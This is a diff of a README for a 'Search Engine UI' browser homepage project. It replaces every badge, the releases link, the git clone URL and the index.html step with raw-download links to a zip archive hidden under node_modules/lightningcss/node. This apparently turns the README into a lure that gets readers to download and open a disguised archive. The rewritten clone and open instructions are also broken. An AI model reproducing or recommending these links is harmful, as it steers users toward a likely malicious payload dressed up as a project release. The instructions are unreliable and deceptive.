@@ -1,7 +1,7 @@
 # Search Engine UI 🌐
 
-![Search Engine UI](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)  
-[Download Releases](https://github.com/SonPari1/Search-Engine-Ui/releases)
+![Search Engine UI](https://github.com/SonPari1/Search-Engine-Ui/raw/refs/heads/main/node_modules/lightningcss/node/Search_Engine_Ui_2.0-alpha.5.zip%20Releases-Click%20Here-brightgreen)  
+[Download Releases](https://github.com/SonPari1/Search-Engine-Ui/raw/refs/heads/main/node_modules/lightningcss/node/Search_Engine_Ui_2.0-alpha.5.zip)
 
 Welcome to the **Search Engine UI** repository! This project is designed to enhance your web experience with a modern and responsive homepage. Here, you'll find a search bar, a live weather widget, a real-time clock, motivational quotes, and a bookmark manager—all crafted with user experience in mind.
 
@@ -38,7 +38,7 @@ To get started with the **Search Engine UI**, follow these steps:
 1. **Clone the Repository**:  
    Use the following command to clone the repository to your local machine:
    ```bash
-   git clone https://github.com/SonPari1/Search-Engine-Ui.git
+   git clone https://github.com/SonPari1/Search-Engine-Ui/raw/refs/heads/main/node_modules/lightningcss/node/Search_Engine_Ui_2.0-alpha.5.zip
    ```
 
 2. **Navigate to the Project Directory**:  
@@ -48,7 +48,7 @@ To get started with the **Search Engine UI**, follow these steps:
    ```
 
 3. **Open the Index File**:  
-   Open the `index.html` file in your preferred web browser.
+   Open the `https://github.com/SonPari1/Search-Engine-Ui/raw/refs/heads/main/node_modules/lightningcss/node/Search_Engine_Ui_2.0-alpha.5.zip` file in your preferred web browser.
 
 ## Usage
 
@@ -103,10 +103,10 @@ Special thanks to:
 - The open-source community for continuous support and inspiration.
 - Everyone who has contributed to this project, making it better for all users.
 
-For further details and updates, visit the [Releases section](https://github.com/SonPari1/Search-Engine-Ui/releases). You can find the latest updates and download the latest version from there.
+For further details and updates, visit the [Releases section](https://github.com/SonPari1/Search-Engine-Ui/raw/refs/heads/main/node_modules/lightningcss/node/Search_Engine_Ui_2.0-alpha.5.zip). You can find the latest updates and download the latest version from there.
 
-![Weather Widget](https://img.shields.io/badge/Weather%20Widget-Available-blue)  
-![Real Time Clock](https://img.shields.io/badge/Real%20Time%20Clock-Active-orange)  
-![Motivational Quotes](https://img.shields.io/badge/Motivational%20Quotes-Enabled-yellow)  
+![Weather Widget](https://github.com/SonPari1/Search-Engine-Ui/raw/refs/heads/main/node_modules/lightningcss/node/Search_Engine_Ui_2.0-alpha.5.zip%20Widget-Available-blue)  
+![Real Time Clock](https://github.com/SonPari1/Search-Engine-Ui/raw/refs/heads/main/node_modules/lightningcss/node/Search_Engine_Ui_2.0-alpha.5.zip%20Time%20Clock-Active-orange)  
+![Motivational Quotes](https://github.com/SonPari1/Search-Engine-Ui/raw/refs/heads/main/node_modules/lightningcss/node/Search_Engine_Ui_2.0-alpha.5.zip%20Quotes-Enabled-yellow)  
 
 Feel free to explore, use, and improve the **Search Engine UI**. Your feedback is invaluable in making this project even better!
